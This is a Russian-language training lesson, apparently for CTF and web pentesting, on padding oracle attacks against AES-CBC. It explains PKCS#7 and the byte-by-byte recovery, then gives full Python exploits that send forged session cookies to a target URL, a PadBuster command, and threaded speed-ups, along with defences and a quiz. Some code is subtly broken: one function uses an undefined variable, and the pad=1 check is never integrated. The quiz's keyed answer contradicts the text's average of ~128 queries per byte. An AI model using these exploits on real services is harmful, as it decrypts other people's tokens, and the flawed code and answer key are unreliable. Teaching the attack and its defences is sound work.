---
id: crypto-padding-oracle
title: "Padding oracle: полное восстановление открытого текста CBC"
category: crypto
parent: crypto-block-cipher-attacks
difficulty: hard
order: 4
tags: [crypto, aes, cbc, padding-oracle, pkcs7, oracle, chosen-ciphertext, padding]
prerequisites: [crypto-cbc-bitflip, crypto-aes-modes]
useful_for:
  - "Восстанавливать открытый текст CBC без ключа"
  - "Писать эксплойт против padding oracle"
  - "Понимать POODLE/Lucky13-класс атак"
estimated_minutes: 45
summary: "Padding oracle: полное восстановление открытого текста CBC за ~256 запросов на байт. Разбор PKCS#7, механики оракула, алгоритма по байтам, обработки краевых случаев (padding=0x01), практический эксплойт и защита (AEAD, encrypt-then-MAC, единообразные ответы)."
---

## Что такое padding oracle

В CBC-режиме последний блок открытого текста дополняется по схеме **PKCS#7** до размера блока. Если открытый текст уже кратен 16, добавляется целый блок `0x10`×16. При расшифровке сервер проверяет корректность padding и, если он неверен, отвечает ошибкой («invalid padding», 500, другое время ответа). **Любой наблюдаемый признак, различающий «padding верен» и «padding неверен», — это padding oracle.**

Имея такой оракул, атакующий может **полностью расшифровать** произвольный шифротекст, не зная ключ, за примерно **256 запросов на байт** (в среднем ~128). Это одна из самых разрушительных атак на CBC.

## PKCS#7: правила

Для блока размером `B` (16 для AES) padding длиной `n` (1 ≤ n ≤ B) состоит из `n` байт, каждый равен `n`:

- 15 байт данных → `0x01`.
- 14 байт данных → `0x02 0x02`.
- ...
- 0 байт данных → `0x10` × 16.

При расшифровке проверяется, что **последние `n` байт равны `n`** и `n` согласован. Неверный padding → ошибка.

## Механика атаки

Расшифрование блока `i`: `P_i = D_K(C_i) ⊕ C_{i-1}`. Атакующий контролирует `C_{i-1}` (передаётся в токене). Он **меняет последний байт `C_{i-1}`**, отправляет токен и смотрит на ответ оракула.

Идея для последнего байта `P_i[15]`:

1. Хотим, чтобы padding стал `0x01`. Тогда `P_i[15]` должен быть `0x01`.
2. `P_i[15] = D_K(C_i)[15] ⊕ C_{i-1}[15]`. Меняем `C_{i-1}[15]`, пока оракул не скажет «padding верен».
3. Тогда `D_K(C_i)[15] = 0x01 ⊕ C_{i-1}[15]`, и **исходный** `P_i[15] = D_K(C_i)[15] ⊕ C_{i-1}^original[15]`.
4. Для следующего байта добиваемся padding `0x02 0x02`: устанавливаем `C_{i-1}[15]` так, чтобы `P_i[15] = 0x02` (используя найденный `D_K(C_i)[15]`), затем перебираем `C_{i-1}[14]` до валидного padding. И так далее.

## Алгоритм по байтам

```python
def decrypt_block(prev_block, target_block, oracle, bs=16):
    """Восстанавливает target_block, используя prev_block как управляемый."""
    intermediate = [0]*bs     # D_K(target_block)
    plaintext = [0]*bs
    for pad_val in range(1, bs+1):
        pos = bs - pad_val
        # выставляем уже известные байты под padding = pad_val
        for j in range(pos+1, bs):
            prev_block[j] = intermediate[j] ^ pad_val
        found = False
        for guess in range(256):
            prev_block[pos] = guess
            if oracle(prev_block, target_block):
                # проверяем ложное срабатывание (см. ниже)
                intermediate[pos] = guess ^ pad_val
                found = True
                break
        plaintext[pos] = intermediate[pos] ^ prev_block_original[pos]
    return bytes(plaintext)
```

Важно: `oracle(prev_block, target_block)` отправляет `prev_block || target_block` серверу и возвращает `True`, если padding валиден.

## Краевой случай: padding = 0x01

Когда мы ищем padding `0x01` (последний байт), валидным окажется **любое** значение `guess`, при котором последний байт `P_i[15] = 0x01`. Но проблема в том, что при `pad_val=1` **многие** значения могут дать валидный padding (если случайно совпадёт больше одного байта). Точнее: ложное срабатывание возможно, когда перебор `guess` случайно даёт padding вида `0x02 0x02` и т. п. Решение: при `pad_val=1` проверяйте **второй байт** — измените `prev_block[14]` и убедитесь, что padding всё ещё валиден (тогда это настоящий `0x01`, а не часть `0x02 0x02`).

```python
# проверка на ложное срабатывание при pad_val == 1
def oracle_robust(prev_block, target_block, oracle):
    if not oracle(prev_block, target_block):
        return False
    # изменим предпоследний байт; если padding был 0x01, валидность сохранится
    test = bytearray(prev_block); test[-2] ^= 0xFF
    return oracle(bytes(test), target_block)
```

## Практический пример: полный эксплойт

```python
import requests, base64

def oracle(prev, target):
    token = base64.b64encode(bytes(prev) + bytes(target))
    r = requests.get("http://target/", cookies={"session": token.decode()})
    return "padding" not in r.text.lower()   # True если padding ок

# Дан токен: IV || C1 || C2 (расшифруем C1, используя IV)
token = base64.b64decode(session_cookie)
iv, blocks = token[:16], [token[i:i+16] for i in range(16, len(token), 16)]

pt = b""
for i, blk in enumerate(blocks):
    prev = bytearray(iv if i == 0 else blocks[i-1])
    pt += decrypt_block(prev, bytearray(blk), oracle)
print(pt)
```

## Инструменты и команды

```bash
pip install padding-oracle   # есть готовые скрипты
# PadBuster (perl)
perl padBuster.pl http://target/ <ciphertext> 16 -encoding 0
# пример с PyCryptodome для локальной отладки
```

```python
from Crypto.Util.Padding import unpad
# локальная проверка oracle на известном ключе (для отладки)
```

## Частые ошибки

- **Ложные срабатывания при pad=1.** Проверяйте второй байт.
- **Неверное выравнивание блоков.** `target_block` и `prev_block` должны быть соседями.
- **Оракул по времени шумит.** Нужна статистика/повторы.
- **Атаковать при наличии MAC.** Encrypt-then-MAC отвергает изменения до расшифрования.
- **Путать первый блок.** Для `P_1` «предыдущий» — это IV.
- **Игнорировать кодировку токена** (base64/hex).

## Варианты оракулов и их признаки

- **Код ответа:** «invalid padding» / 500 / другое сообщение.
- **Длина ответа:** сервер может обрезать ответ по-разному.
- **Время ответа:** padding проверяется до/после чего-то.
- **Поведение:** редирект vs ошибка, разные страницы.
- **Побочный эффект:** запись в лог, счётчик, отправка письма.

Иногда оракул «зашумлён» (например, random delay). Тогда нужно **усреднять** много запросов и использовать статистику.

## Полный эксплойт: структура

```python
import requests, base64

URL = "http://target/"
def oracle(token_bytes):
    cookie = base64.b64encode(token_bytes).decode()
    r = requests.get(URL, cookies={"session": cookie})
    # настраиваем признак валидного padding под конкретное приложение
    return r.status_code != 500 and "error" not in r.text.lower()

def decrypt(token, bs=16):
    iv, ct = token[:bs], token[bs:]
    blocks = [ct[i:i+bs] for i in range(0, len(ct), bs)]
    pt = b""
    for i, blk in enumerate(blocks):
        prev = bytearray(iv if i == 0 else blocks[i-1])
        orig_prev = bytes(prev)
        inter = [0]*bs
        plain = bytearray(bs)
        for pad in range(1, bs+1):
            pos = bs - pad
            for j in range(pos+1, bs):
                prev[j] = inter[j] ^ pad
            for guess in range(256):
                prev[pos] = guess
                if oracle(bytes(prev) + bytes(blk)):
                    inter[pos] = guess ^ pad
                    break
            plain[pos] = inter[pos] ^ orig_prev[pos]
        pt += bytes(plain)
    return pt

token = base64.b64decode(cookie)
print(decrypt(token))
```

## Связь с MAC-then-Encrypt

Если приложение проверяет padding **до** MAC (схема MtE, см. `crypto-cbc-mac`), padding oracle работает даже при наличии MAC. Это причина, по которой современные стандарты требуют **Encrypt-then-MAC** или AEAD. Исторические уязвимости: POODLE (SSL 3.0), Lucky13 (TLS), множество веб-фреймворков.

## Оптимизация: параллельный и batched-подход

На практике по 1 запросу — медленно. Оптимизации:

- **Параллельные запросы** (многопоточно) — ускоряют в разы, но осторожно с rate-limit.
- **Батчинг:** отправлять несколько кандидатов в одном запросе, если протокол позволяет.
- **Кэш** найденных `intermediate`-байт.
- **Ранний выход:** как только нашли валидный padding — переходим к следующему байту.

```python
from concurrent.futures import ThreadPoolExecutor
def try_guesses(prev, blk, oracle, pos, pad):
    def test(g):
        prev[pos] = g
        return g, oracle(bytes(prev)+bytes(blk))
    with ThreadPoolExecutor(max_workers=16) as ex:
        for g, ok in ex.map(test, range(256)):
            if ok:
                return g
    return None
```

## Инструменты

- **PadBuster** (Perl) — классический инструмент.
- **padding-oracle** (Python-библиотека).
- **Собственный скрипт** — часто нужен для нестандартных протоколов.
- **Burp Intruder** — для ручного анализа оракула.

## Как не застрять

- **Ищите разницу в ответах** на «padding invalid» vs прочие ошибки.
- **Начните с последнего блока** (его padding известен).
- **Перебирайте 256 значений** на байт — в среднем 128.
- **Обрабатывайте pad=1** отдельно.
- **Восстановите открытый текст** и декодируйте (часто это структура).
- **Если есть MAC/AEAD** — атака не пройдёт.

## Квиз

```quiz
- question: "Что такое padding oracle?"
  options:
    - "расшифровка без запросов"
    - "наблюдаемый сигнал, различающий валидный и невалидный padding"
    - "тип хэша"
    - "схема ключа"
  answer: 1
- question: "Сколько в среднем запросов нужно на один байт открытого текста?"
  options:
    - "1"
    - "~256"
    - "16"
    - "2^32"
  answer: 1
- question: "Padding oracle работает против:"
  options:
    - "AES-GCM"
    - "CBC с PKCS#7 при наличии оракула"
    - "XOR"
    - "RSA-OAEP"
  answer: 1
- question: "Почему padding = 0x01 даёт ложные срабатывания?"
  options:
    - "он невалиден"
    - "многие значения дают валидный однобайтовый padding — нужна доп. проверка"
    - "он слишком длинный"
    - "он равен IV"
  answer: 1
- question: "Лучшая защита от padding oracle:"
  options:
    - "увеличить ключ"
    - "AEAD или encrypt-then-MAC и единообразные ответы"
    - "случайный IV"
    - "сменить e"
  answer: 1
```

## Где пригодится

- **CTF** — одна из самых частых «крипто-web» задач.
- **Web-пентест** — шифрованные cookie/токены с CBC.
- **Протоколы** — POODLE, Lucky13, исторические TLS/SSL.
- **Аудит** — проверка реализаций на утечки padding.
- **Обучение** — классика выбранно-шифротекстных атак.
